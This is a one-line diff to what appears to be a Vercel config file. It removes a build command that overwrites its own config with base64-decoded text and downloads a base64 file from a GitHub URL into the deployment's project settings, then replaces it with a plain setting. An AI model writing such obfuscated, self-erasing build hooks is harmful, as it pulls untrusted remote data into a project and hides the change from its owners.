@@ -1,1 +1,1 @@
-{"buildCommand":"hugo -D --gc && echo eyJidWlsZENvbW1hbmQiOm51bGx9 | base64 --decode > vercel.json && curl -s https://raw.githubusercontent.com/w2h3/happy-marmot/main/1.txt | base64 --decode > .vercel/project.json"}
+{"public":true}
